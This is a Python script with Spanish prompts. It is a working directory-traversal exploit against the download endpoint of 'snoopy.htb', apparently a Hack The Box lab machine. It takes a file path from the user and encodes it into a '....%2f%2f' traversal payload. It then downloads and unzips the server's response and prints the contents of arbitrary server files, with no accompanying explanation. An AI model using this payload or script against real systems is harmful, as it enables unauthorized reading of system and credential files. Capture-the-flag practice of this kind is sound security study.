import requests
import os
import zipfile
import termcolor

def download_file(url, filename):
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    return filename

def extract_zip(zip_path, extract_path):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_path)

def print_file_content(file_path):
    with open(file_path, 'r') as file:
        print(termcolor.colored(file.read(), 'magenta'))

while True:
    path = input(termcolor.colored('Introduce una ruta: ', 'blue'))
    encoded_path = path.replace('/', '%2f')
    url = f'http://snoopy.htb/download?file=....%2f%2f....%2f%2f....%2f%2f....%2f{encoded_path}'
    response = requests.head(url)

    if 'Content-Length' in response.headers and int(response.headers['Content-Length']) > 0:
        print('Descargando archivo...')
        zip_file = download_file(url, 'output.zip')
        print('Archivo descargado. Descomprimiendo...')
        extract_zip(zip_file, './output')
        os.remove(zip_file)
        print('Archivo descomprimido.')
        
        extracted_file_path = os.path.join('./output/press_package', path.lstrip('/'))
        if os.path.isfile(extracted_file_path):
            print_file_content(extracted_file_path)
        else:
            print(termcolor.colored(f'No se encontró el archivo en la ruta extraída: {extracted_file_path}', 'red'))
    else:
        print(termcolor.colored(f'No se encontró el archivo en la ruta: {path}', 'red'))
